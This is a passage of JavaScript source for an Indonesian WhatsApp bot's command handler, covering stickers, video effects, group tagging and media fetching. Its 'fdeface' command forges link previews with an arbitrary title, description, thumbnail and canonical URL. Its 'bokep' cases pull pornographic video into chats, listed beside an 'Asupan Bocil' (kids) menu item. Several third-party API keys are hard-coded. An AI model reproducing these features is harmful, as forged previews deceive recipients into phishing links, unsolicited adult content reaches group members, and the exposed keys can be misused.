            imageMsg = (await pemuda.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
            buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
            contentText:`Nih Kack`,buttons,headerType:4}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)                
            break               
    case 'fast':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!isQuotedVideo) return freply('Reply videonya!')
            freply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pemuda.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!isQuotedVideo) return freply('Reply videonya!')
            freply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pemuda.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!isQuotedVideo) return freply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return freply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            pemuda.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            //if (!isRegister) return freply(mess.only.regis)         
            freply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            pemuda.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            //if (!isRegister) return freply(mess.only.regis)         
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return freply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            pemuda.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
            //if (!isRegister) return freply(mess.only.regis)         
    		if (!isQuotedSticker) return freply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : ``
            dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, pemuda, mek, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            //if (!isRegister) return freply(mess.only.regis)         
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            pemuda.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            pemuda.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            pemuda.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            pemuda.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            freply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break                                                                                                  
    case 'upswteks':
            if (!mek.key.fromMe && !isOwner) return
            if (!q) return freply('Isi teksnya!')
            pemuda.sendMessage('status@broadcast', `${q}`, extendedText)
            freply(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!mek.key.fromMe && !isOwner) return
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await pemuda.downloadMediaMessage(swsw)
            pemuda.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            pemuda.sendMessage(from, bur, text, { quoted: mek })
            } else {
            freply('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!mek.key.fromMe && !isOwner) return
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await pemuda.downloadMediaMessage(swsw)
            pemuda.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            pemuda.sendMessage(from, bur, text, { quoted: mek })
            } else {
            freply('reply videonya!')
            }
            break
    case 'fdeface':
            //if (!isRegister) return freply(mess.only.regis)         
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await pemuda.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await pemuda.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		pemuda.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'tagall':
            if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
            if (!isGroup) return freply(mess.only.group)
            hmzz = (teks, memberr, id) => {(id == null || id == undefined || id == false) ? pemuda.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : pemuda.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } })}        
            members_id = []
            teks = (args.length > 0) ? body.slice(8).trim() : ''
            teks += '\n\n'
            for (let mem of groupMembers) {
            teks += `○ @${mem.jid.split('@')[0]}\n`
            members_id.push(mem.jid)
            }
            hmzz(teks, members_id, true)
            break
    case 'pagi':
            if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
            if (!isGroup) return freply(mess.only.group)
            hmzz = (teks, memberr, id) => {(id == null || id == undefined || id == false) ? pemuda.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : pemuda.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } })}        
            members_id = []
            teks = `*“Selamat pagi, beban keluarga !”*`           
            teks += `${readmore}\n\n`
            for (let mem of groupMembers) {
            teks += `○ @${mem.jid.split('@')[0]}\n`
            members_id.push(mem.jid)
            }
            hmzz(teks, members_id, true)
            break                        
 	case 'hidetag':
			if (!isPremium && !mek.key.fromMe && !isOwner && !isGroupAdmins) return freply('Admin Group Only')
			if (!isGroup) return freply(mess.only.group)
			var value = args.join(' ')
			var group = await pemuda.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			pemuda.sendMessage(from, optionshidetag, text)
			break
    case 'video':
            //if (!isRegister) return freply(mess.only.regis)         
            if (args.length === 0) return freply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            freply(mess.wait)
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
            try {
            ytv(mulaikah)
            .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
            .then(async (a) => {
            if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YT VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
            const captions = `*YT VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait, the media file is being sent it may take a few minutes_`
            sendMediaURL(from, thumb, captions)
            await sendMediaURL(from, dl_link).catch(() => freply('error'))
            })                
            })
            } catch (err) {
            freply(mess.error.api)
            }
            break  
    case 'emoji':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!q) return freply('emojinya?')
            qes = args.join(' ')
            emoji.get(`${qes}`).then(emoji => {
            teks = `${emoji.images[4].url}`
            sendStickerFromUrl(from,`${teks}`)	
            console.log(teks)
            })
            break 
     case 'dadu':
            //if (!isRegister) return freply(mess.only.regis)         
     
			random = Math.floor(Math.random() * 6) + 1
     		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			pemuda.sendMessage(from, damdu, sticker, {quoted: mek})
			break                                                                                                                                        
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            //if (!isRegister) return freply(mess.only.regis)         
            var a = arg.split("|")[0];
            var b = arg.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            pemuda.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
})
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
            .on('exit', () => {
            pemuda.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
})
})
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await pemuda.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            pemuda.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
})
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
            .on('exit', () => {
            pemuda.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
})
})
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            freply(`Kirim gambar dengan caption ${prefix}sticker reply gambar yang ingin dibuat sticker`)
}             
            break               
    case 'toimg':
            //if (!isRegister) return freply(mess.only.regis)         
			if (!isQuotedSticker) return freply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await pemuda.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return freply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'Nih Kack')
			fs.unlinkSync(ran)
			})
			break    
    case 'image':
            //if (!isRegister) return freply(mess.only.regis)         
            if (args.length < 1) return freply('Masukan teks!')
            const gimg = args.join('');
            freply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            pemuda.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
    case 'brainly':
            //if (!isRegister) return freply(mess.only.regis)         
			if (args.length < 1) return freply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			pemuda.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
    case 'igstalk':
            //if (!isRegister) return freply(mess.only.regis)         
            if (!q) return freply('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    			 
    case 'totag':
            //if (!isRegister) return freply(mess.only.regis)         
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
             contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            mimetype : 'audio/mp4',
            ptt : true,
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            mimetype : 'video/mp4',
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
            } else{
            freply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
            }
            break
    case 'tomp4':
            //if (!isRegister) return freply(mess.only.regis)         
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await pemuda.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            freply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break

    case 'tourl':
    case 'imagetorul':
    case 'imgtourl':
    case 'audiotourl':
    case 'videotourl':
    case 'stickertourl':
    case 'stikertourl':
    case 'tolink':
           //if (!isRegister) return freply(mess.only.regis)         
           var imgbb = require('imgbb-uploader')
           if (isQuotedAudio) {
           ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
           freply(mess.wait)
           owgi = await pemuda.downloadAndSaveMediaMessage(ger)
           Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
           teks=`*─ 「 AUDIO TO URL 」 ─*

*$Url : ${Okelor.display_url}*`
           freply(teks) 
           } else if (isQuotedImage) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           freply(mess.wait)
           owgi = await pemuda.downloadAndSaveMediaMessage(ger)
           qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
           teks=`*─ 「 IMAGE TO URL 」 ─*

*Url : ${qbc.display_url}*`
           freply(teks)
           } else if (isQuotedVideo) {
           ger = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           freply(mess.wait)
           owgi = await pemuda.downloadAndSaveMediaMessage(ger)
           ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
           teks=`*─ 「 VIDEO TO URL 」 ─*

*$Url : ${ffff.display_url}*`
           freply(teks)
           } else if (isQuotedSticker) {
           ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
           freply(mess.wait)
           owgi = await pemuda.downloadAndSaveMediaMessage(ger)
           vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
           teks=`*─ 「 STICKER TO URL 」 ─*

*Url : ${vrr.display_url}*`
           freply(teks)
           }
           break  
           
//---------------< Asupan >--------------
case "asupan":
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya Kak✨`, [
          {
            buttonId: `${prefix}+62`,
            buttonText: {
              displayText: `Asupan +62`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ghea`,
            buttonText: {
              displayText: `Asupan Ghea`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan2`,
            buttonText: {
              displayText: `Next Asupan`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan2":
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.2 kak✨`, [
          {
            buttonId: `${prefix}santuy`,
            buttonText: {
              displayText: `Asupan Santuy`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}bocil`,
            buttonText: {
              displayText: `Asupan Bocil`,
            },
            type: 1,
          },          
          {
            buttonId: `${prefix}asupan3`,
            buttonText: {
              displayText: `Next Asupan`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan3":
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.3 kak✨`, [
          {
            buttonId: `${prefix}asupanindo`,
            buttonText: {
              displayText: `Asupan Indo`,
            },
            type: 1,
          },  
          {
            buttonId: `${prefix}asupantiktok`,
            buttonText: {
              displayText: `Asupan TikTok`,
            },
            type: 1,
          },                         
          {
            buttonId: `${prefix}asupan4`,
            buttonText: {
              displayText: `Next Asupan`,
            },
            type: 1,
          },
        ]);
        break;                
case "asupan4": 
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.4 kak✨`, [
          {
            buttonId: `${prefix}rikagusriani`,
            buttonText: {
              displayText: `Asupan Rikagusriani`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ukhti`,
            buttonText: {
              displayText: `Asupan Ukhti`,
            },
            type: 1,
          },          
          {
            buttonId: `${prefix}bokepp`,
            buttonText: {
              displayText: `Asupan Bokep`,
            },
            type: 1,
          },
        ]);
        break;
case 'bocil':
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupanbocil?apikey=${dapapi}`)
                    kodo = `Nih Kack Asupannya︎`
   sendButVideo(from, kodo, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `➡️ Next`,
            },
            type: 1,
          },
        ]);                 
                    break    
case '+62':
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupan?apikey=${dapapi}`)
                    pll = `Nih Kack Asupannya︎`
   sendButVideo(from, pll, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `➡️ Next`,
            },
            type: 1,
          },
        ]);                 
                    break 
case 'bokepp':
case 'bokep':
 get_result = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
 knnntl = `Nih Kack Asupannya`
  sendButVideo(from, knnntl, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix}bokepp`,
            buttonText: {
              displayText: `➡️Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break  
case 'asupantiktok':            
          haio = (`https://hardianto-chan.herokuapp.com/api/asupan?apikey=hardianto`)
          kon0 = await getBuffer(haio)
          pll = `︎Nih Kack Asupannya`
   sendButVideo(from, pll, `Klik Next Untuk Melanjutkan`, kon0, [                      
          {
            buttonId: `${prefix}asupantiktok`,
            buttonText: {
              displayText: `➡️ Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break
case 'asupanindo':
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupan?apikey=${dapapi}`)
                    pll = `Nih Kack Asupannya︎`
   sendButVideo(from, pll, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix}asupanindo`,
            buttonText: {
              displayText: `➡️ Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break                                         
case 'santuy':
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupansantuy?apikey=${dapapi}`)
                    hhh = `Nih Kack Asupannya︎`
   sendButVideo(from, hhh, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `➡️ Next`,
            },
            type: 1,
          },
        ]);                 
                    break 
case 'ukhti':
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupanukhty?apikey=${dapapi}`)
                    kntl = `Nih Kack Asupannya︎`
   sendButVideo(from, kntl, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `➡️ Next`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'rikagusriani':
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupanrikagusriani?apikey=${dapapi}`)
                    yyy = `Nih Kack Asupannya︎`
   sendButVideo(from, yyy, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `➡️ Next`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'ghea':
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupanghea?apikey=${dapapi}`)
                    ggg = `Nih Kack Asupannya︎`
   sendButVideo(from, ggg, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `➡️ Next`,
            },
            type: 1,
          },
        ]);                 
                    break   

//---------------< Random Image >--------------   
      case 'randomukhti':
      case 'randomukhty':
      case 'randomukthy':
      case 'randomukthi':
              v = await hx.pinterest('randomukhti')
              v2 = v[Math.floor(Math.random() * v.length)]
              buff = await getBuffer(v2)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await pemuda.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
              contentText:`Nih Kack`,buttons,headerType:4}
              prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              pemuda.relayWAMessage(prep)
              break
      case 'cewethailand':
      case 'randomthailand':
      case 'randomcewethailand':
              v = await hx.pinterest('cewethailand')
              v2 = v[Math.floor(Math.random() * v.length)]
              buff = await getBuffer(v2)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await pemuda.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
              contentText:`Nih Kack`,buttons,headerType:4}
              prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
